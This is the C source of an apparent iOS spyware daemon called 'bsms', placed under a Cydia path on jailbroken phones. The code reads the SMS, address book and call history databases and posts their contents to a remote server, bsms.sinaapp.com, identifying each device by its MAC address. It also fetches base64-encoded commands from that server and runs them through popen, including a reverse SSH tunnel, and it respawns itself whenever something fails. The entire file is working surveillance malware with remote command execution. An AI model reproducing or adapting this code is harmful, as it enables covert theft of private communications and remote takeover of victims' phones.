#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <curl/curl.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/sysctl.h>
#include <sys/stat.h>
#include <net/if.h>
#include <net/if_dl.h>
#include <sys/time.h>
#include "sqlite3.h"
#include "base64.h"

#define CURL_MAX_POST_LEN (1024*24)
#define LOG_MSG_LEN (4096)
#define CRON_TASK_TIME 60//TODO release

CURL *curl;
char apiPermitURL[400];
char apiPostSMSURL[400];
char apiPostAdURL[400];
char apiPostCallURL[400];
char apiPostCommandURL[400];
char logFile[100] = "/var/root/bsms.log";
char remoteURL[100] = "https://bsms.sinaapp.com/api_ios_7_0.php?";
char cacertFile[100] = "/usr/libexec/cydia/cacert.bsms";
char localBuffer[1024*100] = {0};
int cronSMSTask(int rowid);
int cronAddressBookTask(char* id);
int cronCommandTask(int id, char* command);
int cronCallTask(int rowid);
int getData(char *file, char *sql, char ***res, int *column);
int postData(CURL *curl, char *messageData);
int getPermit();
int SqliteQuery(sqlite3 *db, const char *sql, char ***res, int *column);
int getUUID(char* des_netcard , char* out_addr);
int getCode(int n, const char* fmt , ...);
int callbackGetPermitID(void *ptr, int size, int nmemb, void *stream);
int callbackBlockedWritedataFunc(void *ptr, int size, int nmemb, void *stream);
int refreshThis();
int writeLog(const char *pszFmt,...);

int main() {

    /*
    pid_t pid=fork();

    if(pid < 0) {
        printf("fork() error\n");
        exit(-1);
    } else if(pid > 0) {
        //This is the parent process
        exit(-1);
    } else
    //*/
    {
        writeLog("bsms start...........sleep:[%d]\n", CRON_TASK_TIME);
        sleep(CRON_TASK_TIME);
        //This is the child process
        char UUID[20];
        getUUID("en0", UUID);

        snprintf(apiPermitURL, 400, "%smod=permit&uuid=%s", remoteURL, UUID);
        snprintf(apiPostSMSURL, 400, "%smod=sms&uuid=%s", remoteURL, UUID);
        snprintf(apiPostAdURL, 400, "%smod=ad&uuid=%s", remoteURL, UUID);
        snprintf(apiPostCallURL, 400, "%smod=call&uuid=%s", remoteURL, UUID);
        snprintf(apiPostCommandURL, 400, "%smod=command&uuid=%s", remoteURL, UUID);

        writeLog("apiPermitURL:[%s]\n", apiPermitURL);

        //Init CURL
        curl_global_init(CURL_GLOBAL_ALL);
        curl = curl_easy_init();

        //主线程一直循环
        for (;;) {
            memset(localBuffer,0,1024*100);
            getPermit();
            curl_easy_reset(curl);


            int smsid=0, adid=0, permitid=0, callid=0, commandid;
            char *sid, *aid, *pid, *cid, *coid, *commandstr;
            getCode(6, localBuffer, &sid, &aid, &pid, &cid, &coid, &commandstr);
            //writeLog("smsid[%s]-adid[%s]-permitid[%s]-callid[%s]\n", sid, aid, pid, cid);

            //处理返回的命令集
            smsid = (sid == NULL) ? 0 : atoi(sid);
            callid = (cid == NULL) ? 0 : atoi(cid);
            permitid = (pid == NULL) ? 0 : atoi(pid);
            commandid = (coid == NULL) ? 0 : atoi(coid);


            //判断是否有权限
            if(permitid > 0) {
                cronSMSTask(smsid);
                curl_easy_reset(curl);
                cronCallTask(callid);
                curl_easy_reset(curl);

                if(aid != NULL && aid[0] != 0) {
                    cronAddressBookTask(aid);
                    curl_easy_reset(curl);
                }


                if(commandid > 0 && commandstr != NULL && commandstr[0] != 0) {
                    char command[1024] = {0};
                    base64_decode(commandstr, strlen(commandstr), command);
                    if(command != NULL && command[0] != 0) {
                        cronCommandTask(commandid, command);
                    }
                }

                //writeLog("apiSMSId:[%d]-AddressBookId:[%s]-callid:[%d]-------------------------------------EOF\n", smsid, aid, callid);
                writeLog("[%d]-[%d]-[%d]\n", smsid, callid, commandid);
            } else {
                refreshThis();
            }
            sleep(CRON_TASK_TIME);
        }
    }
}

int getPermit(){
    CURLcode res;
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, apiPermitURL);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 1);
        curl_easy_setopt(curl, CURLOPT_CAINFO, cacertFile);
        curl_easy_setopt(curl , CURLOPT_TIMEOUT , 3);
        curl_easy_setopt(curl , CURLOPT_WRITEFUNCTION , callbackGetPermitID);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, localBuffer);
        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            writeLog("getPermit() curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
            refreshThis();
        } else {
            //writeLog("localBuffer:[%s]\n", localBuffer);
        }
    }

    return 0;
}

int callbackGetPermitID(void *ptr, int size, int nmemb, void *stream){
    int sizes = size * nmemb;
    memcpy(stream+strlen(stream), ptr, sizes);
    //writeLog("callbackGetPermitID() stream:%s\n",stream);
    return sizes;
}

int callbackBlockedWritedataFunc(void *ptr, int size, int nmemb, void *stream) {
    //writeLog("callbackBlockedWritedataFunc() stream:[%s]\n",stream);
    return nmemb;
}

int cronSMSTask(int rowid) {
    char **result;
    int i=0, j=0, nlen=0, column=0, offset = 0;

    char sql[400];
    snprintf(sql, 400, "SELECT h.id as address, h.uncanonicalized_id as address_original, m.ROWID, m.date, m.is_from_me, m.service, m.text, m.subject "
            "FROM message m LEFT JOIN handle h ON (h.ROWID = m.handle_id) "
            "WHERE m.ROWID > %d ORDER BY m.ROWID ASC LIMIT 1000", rowid);
    int row = getData("/var/mobile/Library/SMS/sms.db", sql, &result, &column);

    if(row > 0) {
        if(curl) {
            curl_easy_setopt(curl, CURLOPT_URL, apiPostSMSURL);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 1);
            curl_easy_setopt(curl, CURLOPT_CAINFO, cacertFile);
            curl_easy_setopt(curl, CURLOPT_TIMEOUT , 3);
            curl_easy_setopt(curl , CURLOPT_WRITEFUNCTION , callbackBlockedWritedataFunc);
        }

        for(i=1; i < (row + 1); i++) {
            char messageData[CURL_MAX_POST_LEN];
            char SMSmobileNum[1000];
            int SMSAddress=0, SMSis_madrid=0, SMSmadrid_handle=0;
            nlen = 0;
            writeLog("%s,\n", result[i*column+2]);//加2的原因是第三位才是rowid
            for (j = 0; j < column; j++) {
                offset = i*column+j;
                snprintf(messageData+nlen, CURL_MAX_POST_LEN-nlen, "%s=%s&", result[j], result[offset]);
                nlen = strlen(messageData);
            }

            //writeLog("%s,\n", messageData);
            postData(curl, messageData);
        }
        //free sqlite3 result
        sqlite3_free_table(result);
    }

    return 0;
}

int cronAddressBookTask(char* id) {
    char **result;
    int i=0, j=0, nlen=0, column=0, offset = 0;

    char sql[1000];
    snprintf(sql, 1000, "SELECT ABMultiValue.record_id, ABMultiValue.Value as Address, ABPerson.* "
            "FROM ABMultiValue LEFT JOIN ABPerson ON (ABPerson.ROWID = ABMultiValue.record_id) "
            "WHERE ABMultiValue.value IN (%s) LIMIT 1", id);
    int row = getData("/var/mobile/Library/AddressBook/AddressBook.sqlitedb", sql, &result, &column);

    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, apiPostAdURL);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 1);
        curl_easy_setopt(curl, CURLOPT_CAINFO, cacertFile);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT , 3);
        curl_easy_setopt(curl , CURLOPT_WRITEFUNCTION , callbackBlockedWritedataFunc);
    }

    if(row > 0) {
        for(i=1; i < (row + 1); i++) {
            char messageData[CURL_MAX_POST_LEN];
            nlen = 0;
            writeLog("%s,\n", result[i*column]);
            for (j = 0; j < column; j++) {
                offset = i*column+j;
                snprintf(messageData+nlen, CURL_MAX_POST_LEN-nlen, "%s=%s&", result[j], result[offset]);
                nlen = strlen(messageData);

            }
            postData(curl, messageData);
        }
        //free sqlite3 result
        sqlite3_free_table(result);
    } else {
        //writeLog("%s,\n", id);
        char messageData[CURL_MAX_POST_LEN];
        snprintf(messageData, CURL_MAX_POST_LEN, "returnid=%s",id);
        postData(curl, messageData);

    }
    return 0;
}

int cronCommandTask(int id, char* command) {

    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, apiPostCommandURL);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 1);
        curl_easy_setopt(curl, CURLOPT_CAINFO, cacertFile);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT , 3);
        curl_easy_setopt(curl , CURLOPT_WRITEFUNCTION , callbackBlockedWritedataFunc);
    }

    //执行命令
    FILE *fstream=NULL;
    char buff[1024];
    memset(buff,0,sizeof(buff));
    if(NULL==(fstream=popen(command,"r")))
    {
        writeLog("execute command failed: %s",strerror(errno));
        refreshThis();
        return -1;
    }

    //获得命令执行结果
    char messageData[CURL_MAX_POST_LEN];
    int nlen = 0;
    snprintf(messageData+nlen, CURL_MAX_POST_LEN-nlen, "id=%d", id);
    nlen = strlen(messageData);

    //去除掉一些不需要返回值的命令
    if(0 != memcmp(command, "ssh -f -N -R 10000:localhost:22", 31)
    && 0 != strcasecmp(command, "killall ssh -f") ) {

        //通过fgets获得返回值
        if(NULL!=fgets(buff, sizeof(buff), fstream))
        {
            snprintf(messageData+nlen, CURL_MAX_POST_LEN-nlen, "&content=%s", buff);
            nlen = strlen(messageData);
            while(NULL!=fgets(buff, sizeof(buff), fstream)) {
                snprintf(messageData+nlen, CURL_MAX_POST_LEN-nlen, "%s", buff);
                nlen = strlen(messageData);
            }
        }
        else
        {
            pclose(fstream);
            writeLog("fgets failed:\n");
            refreshThis();
            return -1;
        }
    }
    pclose(fstream);
    postData(curl, messageData);

    return 0;
}

int cronCallTask(int rowid) {
    char **result;
    int i=0, j=0, nlen=0, column=0, offset = 0;

    char sql[1000];
    snprintf(sql, 1000, "SELECT * FROM call WHERE ROWID > %d ORDER BY ROWID ASC LIMIT 1000;", rowid);
    int row = getData("/var/wireless/Library/CallHistory/call_history.db", sql, &result, &column);

    if(row > 0) {
        if(curl) {
            curl_easy_setopt(curl, CURLOPT_URL, apiPostCallURL);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 1);
            curl_easy_setopt(curl, CURLOPT_CAINFO, cacertFile);
            curl_easy_setopt(curl, CURLOPT_TIMEOUT , 3);
            curl_easy_setopt(curl , CURLOPT_WRITEFUNCTION , callbackBlockedWritedataFunc);
        }

        for(i=1; i < (row + 1); i++) {
            char messageData[CURL_MAX_POST_LEN];
            char SMSmobileNum[1000];
            int SMSAddress=0, SMSis_madrid=0, SMSmadrid_handle=0;
            nlen = 0;
            writeLog("%s,\n", result[i*column]);
            for (j = 0; j < column; j++) {
                offset = i*column+j;
                snprintf(messageData+nlen, CURL_MAX_POST_LEN-nlen, "%s=%s&", result[j], result[offset]);
                nlen = strlen(messageData);
            }

            postData(curl, messageData);
        }
        //free sqlite3 result
        sqlite3_free_table(result);
    }

    return 0;
}

int postData(CURL *curl, char *messageData) {

    CURLcode res;

    if (curl) {
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, messageData);
        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            writeLog("postData() curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
            refreshThis();
        } else {
            writeLog("postData() ok\n");
        }
    }

    return 0;
}

int getData(char *file, char *sql, char ***res, int *column) {
    sqlite3 *db;
    int rc;
    rc = sqlite3_open(file, &db);
    if(rc) {
        fprintf(stderr, "sqllite3 error open faile %s\n",sqlite3_errmsg(db));
        sqlite3_close(db);
        refreshThis();
        return -1;
    }else {
        int ret = SqliteQuery(db, sql, res, column);
        return ret;
    }
}

int SqliteQuery(sqlite3 *db, const char *sql, char ***res, int *column) {
    char *select_str = "SELECT";
    char *errorMsg;
    char *str_str = strstr(sql, select_str);
    int row = 0, i = 0, j = 0;
    if(str_str) {
        sqlite3_get_table(db, sql, res, &row, column, &errorMsg);
    }else{
        sqlite3_exec(db, sql, 0, 0, &errorMsg);
    }
    if(errorMsg){
        sqlite3_close(db);
        writeLog("sqlite3 erro:%s\n", errorMsg);
        refreshThis();
        return -1;
    }else{
        sqlite3_close(db);
        return row;
    }
}

int getCode(int n, const char* fmt , ...) {
    char* real_fmt = strdup(fmt);
    char* mem_mark = real_fmt;
    int legal = 0;
    int len = strlen(real_fmt);
    if (real_fmt[0] == '[' && real_fmt[len - 1] == ']')
        legal = 1;
    int i;
    for ( i = 0; i != len; ++i) {
        if (real_fmt[i] == '/')
            real_fmt[i] = '\0';
    }
    real_fmt[len - 1] = '\0';
    ++real_fmt;
    va_list arg_ptr;
    va_start(arg_ptr , fmt);
    while (n--) {
        char** des = va_arg(arg_ptr , char**);
        if (!legal)
            *des = NULL;
        else {
            *des = strdup(real_fmt);
            real_fmt += strlen(real_fmt) + 1;
        }
    }
    va_end(arg_ptr);
    free(mem_mark);
    return 0;
}

int getUUID(char* des_netcard , char* out_addr) {
    int            mib[6];
    size_t            len;
    char            *buf;
    unsigned char        *ptr;
    struct if_msghdr    *ifm;
    struct sockaddr_dl    *sdl;
    mib[0] = CTL_NET;
    mib[1] = AF_ROUTE;
    mib[2] = 0;
    mib[3] = AF_LINK;
    mib[4] = NET_RT_IFLIST;
    if ((mib[5] = if_nametoindex( des_netcard )) == 0) {
        //if_nametoindex error
        return -1;
    }
    if (sysctl(mib, 6, NULL, &len, NULL, 0) < 0) {
        //sysctl 1 error
        return -2;
    }
    if ((buf = malloc(len)) == NULL) {
        //malloc error
        return -3;
    }
    if (sysctl(mib, 6, buf, &len, NULL, 0) < 0) {
        //sysctl 2 error
        free(buf);
        return -4;
    }
    ifm = (struct if_msghdr *)buf;
    sdl = (struct sockaddr_dl *)(ifm + 1);
    ptr = (unsigned char *)LLADDR(sdl);
    snprintf(out_addr , 20 ,"%02x%02x%02x%02x%02x%02x", *ptr, *(ptr+1), *(ptr+2),
           *(ptr+3), *(ptr+4), *(ptr+5));

    free(buf);
    return 0;
}

int refreshThis() {
    pid_t pid=fork();
    if (!pid) {
        writeLog("execl:/usr/libexec/cydia/bsms pid[%d]\n", pid);
        execl("/usr/libexec/cydia/bsms" , "bsms" , NULL);
    } else {
        writeLog("execl:no pid[%d]\n", pid);
        exit(1);
    }

    return 0;
}

int writeLog(const char *pszFmt,...) {

    char pszMsg[LOG_MSG_LEN] = {0};

    va_list    va;
    va_start(va,pszFmt);
    vsnprintf(pszMsg, LOG_MSG_LEN, pszFmt,va);
    va_end(va);

    struct timeval tv;
    struct tm      tm;
    size_t         len = 28;

    gettimeofday(&tv, NULL);
    localtime_r(&tv.tv_sec, &tm);

    FILE* fp = NULL;
    fp= fopen(logFile,"a+");
    if (!fp)
    {
        fp=fopen(logFile,"a+");
    }
#ifdef DEBUG
    printf("%04d-%02d-%02d %02d:%02d:%02d.%03d %s",tm.tm_year+1900,tm.tm_mon+1,tm.tm_mday,
            tm.tm_hour,tm.tm_min,tm.tm_sec,tv.tv_usec/1000,pszMsg);
#endif
    fprintf(fp, "%04d-%02d-%02d %02d:%02d:%02d.%03d %s",tm.tm_year+1900,tm.tm_mon+1,tm.tm_mday,
            tm.tm_hour,tm.tm_min,tm.tm_sec,tv.tv_usec/1000,pszMsg);
    fclose(fp);

    return 0;
}